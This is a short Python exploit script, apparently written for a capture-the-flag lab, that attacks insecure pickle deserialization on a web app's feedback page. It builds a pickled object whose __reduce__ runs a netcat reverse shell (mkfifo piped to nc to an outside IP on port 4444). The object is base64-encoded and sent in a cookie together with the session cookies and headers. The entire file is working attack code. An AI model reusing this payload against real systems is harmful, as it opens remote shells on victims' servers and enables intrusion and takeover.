import requests
import base64
import pickle

#netcat reverse shell
command = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.126.127 4444 >/tmp/f'

class rce():
    def __reduce__(self):
        import os # ensures that whatever is being returned is executed without errors
        return os.system,(command,)

#serializing the rce() class object,encode it in base64 and convert the response froma stream of bytes to a string
payload = base64.b64encode(pickle.dumps(rce())).decode('UTF-8') 


#feedback header which initiates connection to the webiste and pass the payload
import requests

cookies = {
    'userType': 'user',
    'username': 'nerd',
    'sessionId': 'gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAMjRjYTg3YmU3MzM5NDRjMWFiOTBhZjY1Njg2Nzc3ZGJxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==',
    'password': 'meow',
    'registrationTimestamp': '2020-11-30 09:58:27.816801',
    'encodedPayload': f'{payload}',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://10.10.86.220/myprofile',
    'Accept-Language': 'en-US,en;q=0.9',
}

response = requests.get('http://10.10.86.220/feedback', headers=headers, cookies=cookies, verify=False)
